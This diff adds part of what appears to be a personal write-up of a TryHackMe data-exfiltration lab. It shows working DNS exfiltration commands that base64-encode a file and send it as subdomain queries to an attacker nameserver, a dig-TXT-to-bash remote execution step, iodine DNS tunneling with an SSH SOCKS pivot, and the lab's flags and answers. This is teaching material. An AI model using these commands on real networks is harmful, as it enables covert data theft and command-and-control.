@@ -1072,3 +1072,540 @@ thm@jump-box$ ssh thm@attacker.thm.com
 ```
 Or from the AttackBox machine using the 10.10.20.177 and port 2322 as follows,
 ```text
+Connect to the Attacker machine via SSH Client from AttackBox
+
+           
+			
+root@AttackBox$ ssh thm@10.10.20.177 -p 2322
+```
+In order to receive any DNS request, we need to capture the network traffic for any incoming UDP/53 packets using the tcpdump tool.
+```text
+Capturing DNS requests on the Attacker Machine
+
+           
+			
+thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
+tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
+Once the attacker machine is ready, we can move to the next step which is to connect to our victim2 through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.
+```text
+Connect to Victim 2 via SSH Client from JumpBox
+
+           
+			
+thm@jump-box$ ssh thm@victim2.thm.com
+```
+Or from the AttackBox machine using the 10.10.20.177 and port 2122 as follows,
+```text
+Connect to Victim 2 via SSH Client from AttackBox
+
+           
+			
+root@AttackBox$ ssh thm@10.10.20.177 -p 2122
+```
+On the victim2 machine, there is a task9/credit.txt file with dummy data.
+```text
+Checking the content of the creds.txt file
+
+           
+			
+thm@victim2$ cat task9/credit.txt
+Name: THM-user
+Address: 1234 Internet, THM
+Credit Card: 1234-1234-1234-1234
+Expire: 05/05/2022
+Code: 1337
+```
+In order to send the content of a file, we need to convert it into a string representation which could be done using any encoding representation such as Base64, Hex, Binary, etc. In our case, we encode the file using Base64 as follows,
+```text
+Encoding the Content of the credit.txt File
+
+           
+			
+thm@victim2$ cat task9/credit.txt | base64
+TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
+MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
+```
+Now that we have the Base64 representation, we need to split it into one or multiple DNS requests depending on the output's length (DNS limitations) and attach it as a subdomain name. Let's show both ways starting with splitting for multiple DNS requests.
+```text
+Splitting the content into multiple DNS requests
+
+           
+			
+thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 
+TmFtZTogVEhNLXVzZX.att.tunnel.com
+IKQWRkcmVzczogMTIz.att.tunnel.com
+NCBJbnRlcm5ldCwgVE.att.tunnel.com
+hNCkNyZWRpdCBDYXJk.att.tunnel.com
+OiAxMjM0LTEyMzQtMT.att.tunnel.com
+IzNC0xMjM0CkV4cGly.att.tunnel.com
+ZTogMDUvMDUvMjAyMg.att.tunnel.com
+pDb2RlOiAxMzM3Cg==.att.tunnel.com
+```
+In the previous command, we read the file's content and encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group.
+Let's check the other way where we send a single DNS request, which we will be using for our data exfiltration. This time, we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.
+```Splitting the content into a single DNS request
+thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
+TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
+```
+Next, from the victim2 machine, we send the base64 data as a subdomain name with considering the DNS limitation as follows:
+```text
+Send the Encoded data via the dig command
+
+           
+			
+thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
+```
+With some adjustments to the single DNS request, we created and added the dig command to send it over the DNS, and finally, we passed it to the bash to be executed. If we check the Attacker's tcpdump terminal, we should receive the data we sent from victim2.
+```text
+Receiving the Data Using tcpdump
+
+           
+			
+thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)
+    172.20.0.1.56092 > attacker.domain: 19543% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
+22:14:00.288208 IP (tos 0x0, ttl 64, id 60580, offset 0, flags [none], proto UDP (17), length 235)
+    172.20.0.1.36680 > attacker.domain: 23460% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
+22:14:00.289643 IP (tos 0x0, ttl 64, id 48564, offset 0, flags [DF], proto UDP (17), length 69)
+    attacker.52693 > 172.20.0.1.domain: 3567+ PTR? 1.0.20.172.in-addr.arpa. (41)
+22:14:00.289941 IP (tos 0x0, ttl 64, id 60581, offset 0, flags [DF], proto UDP (17), length 123)
+    172.20.0.1.domain > attacker.52693: 3567 NXDomain* 0/1/0 (95)
+```
+Once our DNS request is received, we can stop the tcpdump tool and clean the received data by removing unwanted strings, and finally decode back the data using Base64 as follows,
+```text
+thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+Name: THM-user
+Address: 1234 Internet, THM
+Credit Card: 1234-1234-1234-1234
+Expire: 05/05/2022
+Code: 1337
+```
+Nice! We have successfully transferred the content of the credit.txt over the DNS protocol manually.
+C2 Communications over DNS
+C2 frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files on a victim machine. This section simulates how to execute a bash script over the DNS protocol. We will be using the web interface to add a TXT DNS record to the tunnel.com domain name.
+For example, let's say we have a script that needs to be executed in a victim machine. First, we need to encode the script as a Base64 representation and then create a TXT DNS record of the domain name you control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:
+```text
+#!/bin/bash 
+ping -c 1 test.thm.com
+```
+The script executes the ping command in a victim machine and sends one ICMP packet to test.tunnel.com. Note that the script is an example, which could be replaced with any content. Now save the script to/tmp/script.sh using your favorite text editor and then encode it with Base64 as follows,
+```text
+Encode the Bash Script as Base64 Representation
+
+           
+			
+thm@victim2$ cat /tmp/script.sh | base64 
+IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
+```
+Now that we have the Base64 representation of our script, we add it as a TXT DNS record to the domain we control, which in this case, the tunnel.com. You can add it through the web interface we provide http://10.10.20.177/ or https://10-10-20-177.p.thmlabs.com/ without using a VPN.
+Once we added it, let's confirm that we successfully created the script's DNS record by asking the local DNS server to resolve the TXT record of the script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step.
+```text
+Confirm the TXT record is Added Successfully
+
+           
+			
+thm@victim2$ dig +short -t TXT script.tunnel.com
+```
+We used the dig command to check the TXT record of our DNS record that we added in the previous step! As a result, we can get the content of our script in the TXT reply. Now we confirmed the TXT record, let's execute it as follows,
+```text
+Execute the Bash Script!
+
+           
+			
+thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+```
+Note that we cleaned the output before executing the script using tr and deleting any double quotes ". Then, we decoded the Base64 text representation using base64 -d and finally passed the content to the bash command to execute.
+Now replicate the C2 Communication steps to execute the content of the flag.tunnel.com TXT record and answer the question below.
+What is the maximum length for the subdomain name (label)?
+*63*
+The Fully Qualified FQDN domain name must not exceed ______ characters.
+*255*
+Execute the C2 communication over the DNS protocol of the flag.tunnel.com. What is the flag?
+```text
+thm@jump-box:/tmp$ dig +short -t TXT flag.tunnel.com
+"YmFzaCAtYyAvdXNyL2xvY2FsL3NiaW4vZmxhZy5zaAo="
+thm@jump-box:/tmp$ echo YmFzaCAtYyAvdXNyL2xvY2FsL3NiaW4vZmxhZy5zaAo= | base64 -d
+bash -c /usr/local/sbin/flag.sh
+thm@jump-box:/tmp$ cd /usr/local/sbin
+thm@jump-box:/usr/local/sbin$ ls
+flag.sh  icmp-cnc  icmpdoor  unminimize
+thm@jump-box:/usr/local/sbin$ ./flag.sh
+THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
+```
+### DNS Tunneling
+This task will show how to create a tunnel through the DNS protocol. Ensure that you understand the concept discussed in the previous task (Exifltration over DNS), as DNS Tunneling tools work based on the same technique.
+DNS Tunneling (TCPoverDNS)
+This technique is also known as TCP over DNS, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS Tunneling establishes a communication channel where data is sent and received continuously.
+This section will go through the steps required to establish a communication channel over the DNS. We will apply the technique to the network infrastructure we provided (JumpBox and Victim2) to pivot from Network 2 (192.168.0.0/24) to Network 1 (172.20.0.0/24) and access the internal web server. For more information about the network infrastructure, please check task 2.
+We will be using the iodine tool for creating our DNS tunneling communications. Note that we have already installed iodine on the JumpBox and Attacker machines. To establish DNS tunneling, we need to follow the following steps:
+Ensure to update the DNS records and create new NS points to your AttackBox machine (Check Task 8), or you can use the preconfigured nameserver, which points to the Attacker machine (att.tunnel.com=172.20.0.200).
+Run iodined server from AttackBox or the Attacker machine. (note for the server side we use iodined)
+On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - without d)
+SSH to the machine on the created network interface to create a proxy over DNS. We will be using the -D argument to create a dynamic port forwarding.
+Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.
+https://github.com/yarrick/iodine
+Let's follow the steps to create a DNS tunnel. First, let's run the server-side application (iodined) as follows,
+```text
+Running iodined Server
+
+           
+			
+thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com                                                                                                                                                                     
+Opened dns0
+Setting IP of dns0 to 10.1.1.1
+Setting MTU of dns0 to 1130
+Opened IPv4 UDP socket
+Listening to dns for domain att.tunnel.com
+```
+Let's explain the previous command a bit more:
+Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
+The -f argument is to run the server in the foreground.
+The -c argument is to skip checking the client IP address and port for each DNS request.
+The -P argument is to set a password for authentication.
+The 10.1.1.1/24 argument is to set the network IP for the new network interface (dns0). The IP address of the server will be 10.1.1.1 and the client 10.1.1.2.
+att.tunnel.com is the nameserver we previously set.
+On the JumpBox machine, we need to connect to the server-side application. To do so, we need to execute the following:
+```text
+Victim Connects to the Server
+
+           
+			
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
+Opened dns0                                                                                                                                                     
+Opened IPv4 UDP socket                                                                                                                                          
+Sending DNS queries for att.tunnel.com to 127.0.0.11                                                                                                            
+Autodetecting DNS query type (use -T to override).                                                                                                              
+Using DNS type NULL queries                                                                                                                                     
+Version ok, both using protocol v 0x00000502. You are user #0                                                                                                   
+Setting IP of dns0 to 10.1.1.2                                                                                                                                  
+Setting MTU of dns0 to 1130                                                                                                                                     
+Server tunnel IP is 10.1.1.1                                                                                                                                    
+Testing raw UDP data to the server (skip with -r)                                                                                                               
+Server is at 172.20.0.200, trying raw login: OK                                                                                                                 
+Sending raw traffic directly to 172.20.0.200                                                                                                                    
+Connection setup complete, transmitting data.
+```
+Note that we executed the client-side tool (iodine) and provided the -f and -P arguments explained before. Once the connection is established, we open a new terminal and log in to 10.1.1.1 via SSH.
+Note that all communication over the network 10.1.1.1/24 will be over the DNS. We will be using the -D argument for the dynamic port forwarding feature to use the SSH session as a proxy. Note that we used the -f argument to enforce ssh to go to the background. The -4 argument forces the ssh client to bind on IPv4 only.
+```text
+SSH over DNS
+
+           
+			
+root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
+```
+Now that we have connected to JumpBox over the dns0 network, open a new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080 as proxy settings.
+```text
+Use SSH Connection as a Proxy
+
+           
+			
+root@attacker$ proxychains curl http://192.168.0.100/demo.php
+root@attacker$ #OR
+root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
+```
+We can confirm that all traffic goes through the DNS protocol by checking the Tcpdump on the Attacker machine through the eth0 interface.
+Apply the DNS tunneling technique in the provided network environment and access http://192.168.0.100/test.php to answer the question below.
+When the iodine connection establishes to Attacker, run the ifconfig command. How many interfaces are? (including the loopback interface)
+Execute "ifconfig" from JumpBox once the iodine connection is established.
+*4*
+What is the network interface name created by iodined?
+*dns0*
+Use the DNS tunneling to prove your access to the webserver, http://192.168.0.100/test.php . What is the flag?
+Ensure to pivot through JumpBox to get the flag
+```text
+root@ip-10-10-149-92:~# ssh thm@10.10.51.10
+The authenticity of host '10.10.51.10 (10.10.51.10)' can't be established.
+ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.51.10' (ECDSA) to the list of known hosts.
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 23:33:04 2022 from 10.100.1.151
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+thm@jump-box:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.0.2  netmask 255.255.255.0  broadcast 172.20.0.255
+        ether 02:42:ac:14:00:02  txqueuelen 0  (Ethernet)
+        RX packets 91  bytes 10518 (10.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 66  bytes 12598 (12.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.0.133  netmask 255.255.255.0  broadcast 192.168.0.255
+        ether 02:42:c0:a8:00:85  txqueuelen 0  (Ethernet)
+        RX packets 15  bytes 1186 (1.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
+[sudo] password for thm: 
+Opened dns0
+Opened IPv4 UDP socket
+Sending DNS queries for att.tunnel.com to 127.0.0.11
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries
+Version ok, both using protocol v 0x00000502. You are user #0
+Setting IP of dns0 to 10.1.1.2
+Setting MTU of dns0 to 1130
+Server tunnel IP is 10.1.1.1
+Testing raw UDP data to the server (skip with -r)
+Server is at 172.20.0.200, trying raw login: OK
+Sending raw traffic directly to 172.20.0.200
+Connection setup complete, transmitting data.
+Detaching from terminal...
+thm@jump-box:~$ ifconfig dns0
+dns0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1130
+        inet 10.1.1.2  netmask 255.255.255.0  destination 10.1.1.2
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+thm@jump-box:~$ ping -c 2 10.1.1.1
+PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.
+64 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=0.698 ms
+64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=0.675 ms
+
+--- 10.1.1.1 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1024ms
+rtt min/avg/max/mdev = 0.675/0.686/0.698/0.011 ms
+thm@jump-box:~$ exit
+logout
+Connection to 10.10.51.10 closed.
+root@ip-10-10-149-92:~# ssh thm@10.10.51.10
+thm@10.10.51.10's password: 
+ePermission denied, please try again.
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 23:56:07 2022 from 10.10.149.92
+thm@jump-box:~$ ssh thm@10.10.51.10 -p 2322
+The authenticity of host '[10.10.51.10]:2322 ([10.10.51.10]:2322)' can't be established.
+ECDSA key fingerprint is SHA256:Q5grFzgVm+Q0SWpXsl9lyvPDA73WHtQO7ByKNoB+tMI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.51.10]:2322' (ECDSA) to the list of known hosts.
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 23:50:03 2022 from 10.10.149.92
+thm@attacker:~$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
+[sudo] password for thm: 
+Opened dns1
+Setting IP of dns1 to 10.1.1.1
+Setting MTU of dns1 to 1130
+Opened IPv4 UDP socket
+Listening to dns for domain att.tunnel.com
+
+root@ip-10-10-149-92:~# ssh thm@10.10.51.10
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 13 00:24:59 2022 from 10.10.149.92
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
+[sudo] password for thm: 
+Opened dns1
+Opened IPv4 UDP socket
+Sending DNS queries for att.tunnel.com to 127.0.0.11
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries
+Version ok, both using protocol v 0x00000502. You are user #1
+Setting IP of dns1 to 10.1.1.3
+Setting MTU of dns1 to 1130
+Server tunnel IP is 10.1.1.1
+Testing raw UDP data to the server (skip with -r)
+Server is at 172.20.0.200, trying raw login: ....failed
+Using EDNS0 extension
+Switching upstream to codec Base128
+Server switched upstream to codec Base128
+No alternative downstream codec available, using default (Raw)
+Switching to lazy mode for low-latency
+Server switched to lazy mode
+Autoprobing max downstream fragment size... (skip with -m fragsize)
+...768 not ok.. ...384 not ok.. ...192 not ok.. ...96 not ok.. ...48 not ok.. ...24 not ok.. ...12 not ok.. ...6 not ok.. ...3 not ok.. ...2 not ok.. 
+iodine: found no accepted fragment size.
+iodine: try setting -M to 200 or lower, or try other -T or -O options.
+thm@jump-box:~$ 
+
+root@ip-10-10-149-92:~# ssh thm@10.10.51.10
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 13 00:24:59 2022 from 10.10.149.92
+thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
+[sudo] password for thm: 
+Opened dns1
+Opened IPv4 UDP socket
+Sending DNS queries for att.tunnel.com to 127.0.0.11
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries
+Version ok, both using protocol v 0x00000502. You are user #1
+Setting IP of dns1 to 10.1.1.3
+Setting MTU of dns1 to 1130
+Server tunnel IP is 10.1.1.1
+Testing raw UDP data to the server (skip with -r)
+Server is at 172.20.0.200, trying raw login: ....failed
+Using EDNS0 extension
+Switching upstream to codec Base128
+Server switched upstream to codec Base128
+No alternative downstream codec available, using default (Raw)
+Switching to lazy mode for low-latency
+Server switched to lazy mode
+Autoprobing max downstream fragment size... (skip with -m fragsize)
+...768 not ok.. ...384 not ok.. ...192 not ok.. ...96 not ok.. ...48 not ok.. ...24 not ok.. ...12 not ok.. ...6 not ok.. ...3 not ok.. ...2 not ok.. 
+iodine: found no accepted fragment size.
+iodine: try setting -M to 200 or lower, or try other -T or -O options.
+thm@jump-box:~$ 
+
+root@ip-10-10-149-92:~# ssh thm@10.10.51.10
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 13 00:26:59 2022 from 10.10.149.92
+thm@jump-box:~$ ssh thm@10.10.51.10 -p 2322
+thm@10.10.51.10's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep 13 00:30:06 2022 from 10.10.149.92
+thm@attacker:~$ sudo ssh thm@10.1.1.2 -4 -f -N -D 1080
+[sudo] password for thm: 
+The authenticity of host '10.1.1.2 (10.1.1.2)' can't be established.
+ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.1.1.2' (ECDSA) to the list of known hosts.
+thm@10.1.1.2's password: 
+thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
+
+<p>THM{DN5-Tunn311n9-1s-c00l}</p>
+```
+### Conclusion
+Wrapping Up
+In this room, we covered the basics of data exfiltration techniques, including various network protocols:
+TCP Sockets
+SSH
+HTTP/HTTPS
+ICMP
+DNS
+After finishing up this room, you should now have a general understanding of what Data Exfiltration is, and the types and protocols that you could try to use to transfer data.
+Examples
+The following are companies that were victims of data breaches using data exfiltration techniques.
+SunTrust Bank had an insider data breach that uncovered suspicious traffic leaving the network after the theft of up to 1.5 million customer-sensitive data, including names, addresses, phone numbers, and account balances.
+Tesla was a victim of data exfiltration by an insider, which caused a data breach. In 2018, an employee exfiltrated gigabytes of confidential photos and code manufacturing OS to third parties, including other personal and sensitive data.
+Travelex is the world's leading currency exchange specialist. In 2020, it was a victim of ransomware called Sodinokibi. The attacker exploits an unpatched vulnerability of one of the internal servers. The attacker exploited an unpatched vulnerability in one of the internal servers, which allowed them to exfiltrate sensitive data out of the organization's network using one of the exfiltration techniques. The sensitive data included personally identifiable information (PII) and financial information.
+Additional Resources
+Data Exfiltration is not limited to protocols and methods discussed in this room. The following link is a Living Off Trusted Sites that could be used to exfiltrate data or for C2 communication using legitimate websites.
+Living Off Trusted Sites (LOTS) Project
+https://lots-project.com/
+Read the closing task.
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c2b48bf0b212e640b259a3405c2391b1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c3438995ccff35a5589b9abd3703b14.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/49ad248f2506a5a749dbb70732c32072.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b4c99b2aba13eac24379fee2d20ffbf6.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9931b598f5757bbdfb74004a2a43fe16.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa723bb0e2c39dfc936b135c4912d1cf.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/789a9a13d9977b11d11f53bb7dbb9f3a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fbf6c90063102ca100ba8d544ba9d7f8.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png)
+- ***THM{H77P-G37-15-f0un6}***
+- ***THM{H77p_7unn3l1n9_l1k3_l337}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)
+- ***THM{g0t-1cmp-p4k3t!}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b8b4c25e0eb4dd04f1aea8596bf9319e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/af468d0202712ac1890f5dacb135e532.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e881336d12bd5f24d2167730adda0adc.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38b87cfbbe254bef1e98f0dffa49451f.png)
+- ***THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8176731af9ec61cf248cdbc65df92172.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png)
+- ***THM{DN5-Tunn311n9-1s-c00l}***
+
+## Notes / Lessons Learned
+[[Windows Local Persistence]]
+
